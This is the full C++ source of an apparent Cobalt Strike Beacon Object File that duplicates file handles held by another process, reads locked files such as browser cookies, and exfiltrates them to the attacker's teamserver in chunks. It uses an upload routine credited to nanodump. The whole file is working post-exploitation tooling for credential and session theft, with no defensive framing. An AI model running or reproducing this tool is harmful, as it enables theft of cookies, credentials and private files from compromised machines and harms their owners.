#include <Shlobj.h>
#include <Windows.h>
#include "base\helpers.h"
#include "base\ntdefs.h"
#include <shlwapi.h>
#include <ntstatus.h>
#include <time.h>

#ifdef _DEBUG

#pragma comment (lib, "shell32.lib")
#pragma comment (lib, "Shlwapi.lib")
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#define CALLBACK_FILE 0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#define CHUNK_SIZE 0xe1000
PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
    return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}


extern "C" {
#include "beacon.h"
BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
//Ran into overload issues when using DFR Macro for wcsstr/time. Switched to manual resolution isntead of using Macro for these two methods.
#ifndef _DEBUG
    WINBASEAPI wchar_t* __cdecl MSVCRT$wcsstr(const wchar_t* _Str, const wchar_t* _SubStr);
    #define wcsstr MSVCRT$wcsstr
    WINBASEAPI time_t __cdecl MSVCRT$time(time_t* time);
    #define time MSVCRT$time
    //wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize);
    WINBASEAPI int __cdecl MSVCRT$wcstombs_s(size_t* preturnValue, char* mbstr, size_t sizeInBytes,const wchar_t* wcstr, size_t count);
    #define wcstombs_s MSVCRT$wcstombs_s
#endif
    DFR(KERNEL32, GetLastError);
    DFR(SHELL32, SHGetFolderPathA);
    DFR(SHLWAPI, PathAppendA);
    DFR(KERNEL32, GetProcAddress);
    DFR(KERNEL32, GetModuleHandleA);
    DFR(KERNEL32, VirtualAlloc);
    DFR(KERNEL32, VirtualFree);
    DFR(KERNEL32, OpenProcess);
    DFR(KERNEL32, CloseHandle);
    DFR(KERNEL32, GetCurrentProcess);
    DFR(KERNEL32, HeapAlloc)
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, HeapReAlloc);
    DFR(MSVCRT, memset);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, GlobalAlloc);
    DFR(KERNEL32, ReadFile);
    DFR(KERNEL32, SetFilePointer);
    DFR(KERNEL32, GetFileSize);
    DFR(MSVCRT, wcstombs)
    DFR(MSVCRT, wcscmp)
    DFR(MSVCRT, wcslen)
    DFR(KERNEL32, GetFileType);
    #define GetLastError KERNEL32$GetLastError
    #define SHGetFolderPathA SHELL32$SHGetFolderPathA
    #define PathAppendA SHLWAPI$PathAppendA
    #define GetProcAddress KERNEL32$GetProcAddress
    #define GetModuleHandleA KERNEL32$GetModuleHandleA
    #define VirtualAlloc KERNEL32$VirtualAlloc
    #define VirtualFree KERNEL32$VirtualFree
    #define OpenProcess KERNEL32$OpenProcess
    #define CloseHandle KERNEL32$CloseHandle
    #define GetCurrentProcess KERNEL32$GetCurrentProcess
    #define HeapAlloc KERNEL32$HeapAlloc
    #define GetProcessHeap KERNEL32$GetProcessHeap
    #define HeapReAlloc KERNEL32$HeapReAlloc
    #define memset MSVCRT$memset
    #define HeapFree KERNEL32$HeapFree
    #define GlobalAlloc KERNEL32$GlobalAlloc
    #define ReadFile KERNEL32$ReadFile
    #define SetFilePointer KERNEL32$SetFilePointer
    #define GetFileSize KERNEL32$GetFileSize
    #define wcstombs MSVCRT$wcstombs
    #define wcscmp MSVCRT$wcscmp
    #define wcslen MSVCRT$wcslen
    #define GetFileType KERNEL32$GetFileType

    void go(char* buf,int len) {

        DWORD pid = 0;
        wchar_t* key = NULL;
        wchar_t* value_wchar = NULL;
        int value_int = 0;
        datap parser;
        BOOL Success = false;

        BeaconDataParse(&parser, buf, len);
        pid = BeaconDataInt(&parser);
        key = (wchar_t*)BeaconDataExtract(&parser, NULL);
        size_t keyLen = wcslen(key);

        //Value will either be a wchar_t or int based off wither key value filename or handle_id was chosen
        if (!wcscmp(L"filename", key)) {
            value_wchar = (wchar_t*)BeaconDataExtract(&parser, NULL);
            size_t valueLen = wcslen(value_wchar);
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download of % .*S % .*S from Process ID %i", keyLen, key, valueLen, value_wchar, pid);
        }
        else {
            value_int = BeaconDataInt(&parser);
            BeaconPrintf(CALLBACK_OUTPUT, "Attempting file download using % .*S %i from Process ID %i", keyLen, key,value_int, pid);

        }



        DWORD dwErrorCode = ERROR_SUCCESS;
        PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO curHandle = NULL;
        ULONG handleInfoSize = 1000;
        HANDLE processHandle = NULL;
        HANDLE dupHandle = NULL;
        PVOID objectNameInfo = NULL;
        POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;

        //NTFunctions
        _NtQuerySystemInformation NtQuerySystemInformation;
        _NtDuplicateObject NtDuplicateObject = NULL;
        _NtQueryObject NtQueryObject = NULL;
        _RtlInitUnicodeString RtlInitUnicodeString = NULL;
        _NtClose NtClose = NULL;

        //Obtain handle to process with handle duplication access
        processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if (NULL == processHandle) {
            dwErrorCode = GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to open process %i, error code %i",pid,dwErrorCode);
            return;
        }

        //Resolve NT API Function Addresses
        NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
        NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress("ntdll.dll", "NtDuplicateObject");
        NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");
        NtClose = (_NtClose)GetLibraryProcAddress("ntdll.dll", "NtClose");
        RtlInitUnicodeString = (_RtlInitUnicodeString)GetLibraryProcAddress("ntdll.dll", "RtlInitUnicodeString");

        //Resolve NT Functions
        if ((!NtQuerySystemInformation) || (!NtDuplicateObject) || (!NtQueryObject) || (!NtClose) || (!RtlInitUnicodeString)) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to resolve NT API function addresses");
        }

        // Query the system handles. If the call fails because of a length mismatch, recreate a bigger buffer and try again.
        do
        {
            handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
            dwErrorCode = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, 0);
            if (dwErrorCode == STATUS_INFO_LENGTH_MISMATCH)
            {
                // The length of the buffer was not sufficient. Expand the buffer before retrying.
                HeapFree(GetProcessHeap(), 0, handleInfo);
                handleInfoSize *= 2;
            }
        } while (dwErrorCode == STATUS_INFO_LENGTH_MISMATCH);

        if (dwErrorCode != STATUS_SUCCESS) {
            HeapFree(GetProcessHeap(), 0, handleInfo);
            BeaconPrintf(CALLBACK_ERROR, "Error: Failed to enumerate system handles: error Code %lu", dwErrorCode);
            return;
        }
        //Iterate through System Handles
        for (int i = 0; i < handleInfo->HandleCount; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO objHandle;
            memset(&objHandle,0,sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            objHandle = handleInfo->Handles[i];

            //Check if handle belongs to provided PID
            if (handleInfo->Handles[i].UniqueProcessId != pid) {
                continue;
            }
            //Check if handle type is of type file
            if (handleInfo->Handles[i].ObjectTypeIndex != HANDLE_TYPE_FILE) {
                continue;
            }
            //If using handle_id, we can determine early if it is the handle we are interested in
            if (!wcscmp(L"handle_id", key)) {
                if (value_int != handleInfo->Handles[i].HandleValue) {
                    continue;
                }
            }

            UNICODE_STRING objectName;
            ULONG returnLength = 0;
            memset(&objectName, 0, sizeof(UNICODE_STRING));

            //Reset variables and handles
            if (dupHandle) {
                dwErrorCode = NtClose(dupHandle);
                dupHandle = NULL;
            }
            if (objectTypeInfo) {
                HeapFree(GetProcessHeap(), 0, objectTypeInfo);
                objectTypeInfo = NULL;
            }

            if (objectNameInfo) {
                HeapFree(GetProcessHeap(), 0, objectNameInfo);
                objectNameInfo = NULL;
            }

            //Check Access Mask of handle, can run into issues with 0x001a019f or 0x0012019f
            //GrantedAccess == 0x00120089 || curHandle->GrantedAccess == 0x0012019F || curHandle->GrantedAccess == 0x0012008D
            if (handleInfo->Handles[i].GrantedAccess == 0x001a019f || (handleInfo->Handles[i].HandleAttributes == 0x2 && handleInfo->Handles[i].GrantedAccess == 0x0012019f)) {
                continue;
            }
            
            DWORD currentID = handleInfo->Handles[i].UniqueProcessId;
 

            //Duplicate Handle (Need DUPLICATE_SAME_ACCESS to be able to read from the file if it is locked.
            //Inherit Handle must be false for handle cleanup (When set to true, was unable to close handle after use). 
            dwErrorCode = (DWORD)NtDuplicateObject(processHandle ,(HANDLE)handleInfo->Handles[i].HandleValue,GetCurrentProcess(),&dupHandle, 0, false, DUPLICATE_SAME_ACCESS);
         
            //Check if handle was successfully duplicated
            if (dwErrorCode != STATUS_SUCCESS) {
                continue;
            }
            //Check if the handle exists on disk, otherwise the program will hang
            DWORD fileType = GetFileType(dupHandle);
            if (fileType != FILE_TYPE_DISK) {
                continue;
            }

            //Allocate memory for objectTypeInfo
            objectTypeInfo = (POBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
            //Check if memory was successfully allocated
            if (objectTypeInfo == NULL) {
                continue;

            }

            // Query the object type to get object type information
            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectTypeInformation,objectTypeInfo,0x1000,NULL);
            //Check if the object type was successfully queries
            if (dwErrorCode != STATUS_SUCCESS) {
                continue;
            }

            //Allocate memory for object name info structure
            objectNameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,0x1000);
            if (objectNameInfo == NULL) {
                continue;
            }
            
            //Retrieve object name info
            dwErrorCode = (DWORD)NtQueryObject(dupHandle,ObjectNameInformation,objectNameInfo,0x1000,&returnLength);
            if (dwErrorCode != STATUS_SUCCESS) {

                // Reallocate the buffer and try again.
                objectNameInfo = HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,objectNameInfo, returnLength);
                if (NULL == objectNameInfo) {
                    continue;
                }
                dwErrorCode = (DWORD)NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, NULL);
                if (NULL == objectNameInfo) {
                    continue;
                }
            }

            // Cast our buffer into an UNICODE_STRING.
            objectName = *(PUNICODE_STRING)objectNameInfo;
            if (objectName.Length)
            {

                //Structures to get the fileName
                const wchar_t* filePathBuffer = objectName.Buffer;
                size_t length = objectName.Length / sizeof(wchar_t);

                // Initialize the file name as an empty string
                UNICODE_STRING fileName;
                fileName.Buffer = (PWSTR)(filePathBuffer + length);
                fileName.Length = 0;
                fileName.MaximumLength = 0;

                // Find the last occurrence of the path separator '\'
                for (int i = length - 1; i >= 0; i--) {
                    if (filePathBuffer[i] == '\\') {
                        // Set the file name to the portion of the string after the last '\'
                        fileName.Buffer = (PWSTR)(filePathBuffer + i + 1);
                        fileName.Length = (length - i - 1) * sizeof(wchar_t);
                        fileName.MaximumLength = fileName.Length;
                        break;
                    }
                }
                
                // Check if the provided file name exists within the unicodeString
                int result = 0;
                if (value_wchar != NULL) {
                    UNICODE_STRING substring;
                    RtlInitUnicodeString(&substring, value_wchar);
                    result = wcscmp(fileName.Buffer, substring.Buffer);
                }

                //wchar_t* result = wcsstr(objectName.Buffer, substring.Buffer);
                if (!result) {
                    Success = true;
                    BeaconPrintf(CALLBACK_OUTPUT, "Found file handle!");
                    //Get Size of File
                    SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
                    DWORD dwFileSize = GetFileSize(dupHandle, NULL);
                    BeaconPrintf(CALLBACK_OUTPUT,"File size is %d\n", dwFileSize);
                    //Allocate memory for buffer
                    DWORD dwRead = 0;
                    BOOL status = true;
                    CHAR* buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                    status = ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);

                    #ifdef _DEBUG
                    // Construct the full path to the file on the desktop
                    WCHAR filePath[MAX_PATH];
                    wcscpy(filePath, L"C:\\Users\\defaultuser\\Desktop\\"); ///Select your own directory for debugging purposes
                    wcscat(filePath, fileName.Buffer);

                    // Create or open the file for writing
                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD dwWritten = 0;
                        // Write the contents of the buffer to the file
                        BOOL writeStatus = WriteFile(hFile, buffer, dwRead, &dwWritten, NULL);

                        if (writeStatus) {
                            BeaconPrintf(CALLBACK_OUTPUT,"Data written to file successfully.\n");
                         
                        }
                        else {
                            BeaconPrintf(CALLBACK_ERROR,"Error: Failed to write data to file. Error code: %ul\n", GetLastError());
                        }
                        NtClose(hFile);
                        hFile = NULL;
                    }

                    #else
                    //Convert the wchar_t* string to a multibyte string using wcstombs_s
                    const size_t bufferSize = wcstombs(NULL, fileName.Buffer, 0);
                    if (bufferSize < 1) {
                        BeaconPrintf(CALLBACK_ERROR, "Error: Unable to retrieve file size");
                    }
              
                    char* fileNameChar = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize+1);  // +1 for null-terminator
                    size_t convertedChars = 0;
                    if (!wcstombs_s(&convertedChars, fileNameChar, bufferSize + 1, fileName.Buffer, bufferSize)) {
                        //Upload file to cobalt strike using method from nanodump
                        upload_file(fileNameChar, buffer, dwFileSize);
                        BeaconPrintf(CALLBACK_OUTPUT, "Process ID: %ld, [% #d] % .*S\n", handleInfo->Handles[i].UniqueProcessId, handleInfo->Handles[i].HandleValue, objectName.Length / 2, objectName.Buffer);

                    }
                    else {
                        BeaconPrintf(CALLBACK_ERROR, "Error: Failed to convert file name to char probably because im not the best coder");
                    }
                    #endif
                    break;
                }
            }

        }
        if (Success == false) {
            BeaconPrintf(CALLBACK_OUTPUT, "Error: Failed to find file handle within the specified process");
        }
    cleanup:
        if (handleInfo) {
            VirtualFree(handleInfo, 0, MEM_RELEASE);
            handleInfo = NULL;
        }
        if (processHandle) {
            CloseHandle(processHandle);
            processHandle = NULL;
        }
        if (objectTypeInfo) {
            HeapFree(GetProcessHeap(), 0, objectTypeInfo);
            objectTypeInfo = NULL;
        }

        if (objectNameInfo) {
            HeapFree(GetProcessHeap(), 0, objectNameInfo);
            objectNameInfo = NULL;
        }

        if (dupHandle) {
            CloseHandle(dupHandle);
            dupHandle = NULL;
        }
        return;

        //NtQuerySystemInformation won't give us the correct buffer size,
        //so we guess by doubling the buffer size.
       

        //Enumerate handles within Chrome processes
    }


    // https://github.com/helpsystems/nanodump/blob/3262e14d2652e21a9e7efc3960a796128c410f18/source/utils.c#L630-L728
    BOOL upload_file(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
        DFR_LOCAL(MSVCRT, strnlen);
        DFR_LOCAL(MSVCRT, srand);
        DFR_LOCAL(MSVCRT, rand);
        int fileNameLength = strnlen(fileName, 256);

        // intializes the random number generator
        time_t t;
        srand((unsigned)time(&t));

        // generate a 4 byte random id, rand max value is 0x7fff
        ULONG32 fileId = 0;
        fileId |= (rand() & 0x7FFF) << 0x11;
        fileId |= (rand() & 0x7FFF) << 0x02;
        fileId |= (rand() & 0x0003) << 0x00;

        // 8 bytes for fileId and fileLength
        int messageLength = 8 + fileNameLength;
        char* packedData = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, messageLength);
        if (!packedData) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
            return FALSE;
        }

        // pack on fileId as 4-byte int first
        packedData[0] = (fileId >> 0x18) & 0xFF;
        packedData[1] = (fileId >> 0x10) & 0xFF;
        packedData[2] = (fileId >> 0x08) & 0xFF;
        packedData[3] = (fileId >> 0x00) & 0xFF;

        // pack on fileLength as 4-byte int second
        packedData[4] = (fileLength >> 0x18) & 0xFF;
        packedData[5] = (fileLength >> 0x10) & 0xFF;
        packedData[6] = (fileLength >> 0x08) & 0xFF;
        packedData[7] = (fileLength >> 0x00) & 0xFF;

        // pack on the file name last
        for (int i = 0; i < fileNameLength; i++) {
            packedData[8 + i] = fileName[i];
        }

        // tell the teamserver that we want to download a file
        BeaconOutput(CALLBACK_FILE, packedData, messageLength);
        HeapFree(GetProcessHeap(), 0, packedData);
        packedData = NULL;

        // we use the same memory region for all chucks
        int chunkLength = 4 + CHUNK_SIZE;
        char* packedChunk = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, chunkLength);
        if (!packedChunk) {
            BeaconPrintf(CALLBACK_ERROR, "Error: Could not download the file");
            return FALSE;
        }
        // the fileId is the same for all chunks
        packedChunk[0] = (fileId >> 0x18) & 0xFF;
        packedChunk[1] = (fileId >> 0x10) & 0xFF;
        packedChunk[2] = (fileId >> 0x08) & 0xFF;
        packedChunk[3] = (fileId >> 0x00) & 0xFF;

        ULONG32 exfiltrated = 0;
        while (exfiltrated < fileLength) {
            // send the file content by chunks
            chunkLength = fileLength - exfiltrated > CHUNK_SIZE
                ? CHUNK_SIZE
                : fileLength - exfiltrated;
            ULONG32 chunkIndex = 4;
            for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
                packedChunk[chunkIndex++] = fileData[i];
            }
            // send a chunk
            BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
            exfiltrated += chunkLength;
        }
        HeapFree(GetProcessHeap(), 0, packedChunk);
        packedChunk = NULL;

        // tell the teamserver that we are done writing to this fileId
        char packedClose[4];
        packedClose[0] = (fileId >> 0x18) & 0xFF;
        packedClose[1] = (fileId >> 0x10) & 0xFF;
        packedClose[2] = (fileId >> 0x08) & 0xFF;
        packedClose[3] = (fileId >> 0x00) & 0xFF;
        BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
        return TRUE;
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    //bof::runMocked<int, wchar_t*, wchar_t*>(go, 6696, L"filename", L"Cookies");

    bof::runMocked<int, wchar_t*, int>(go,6328,L"handle_id",552);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif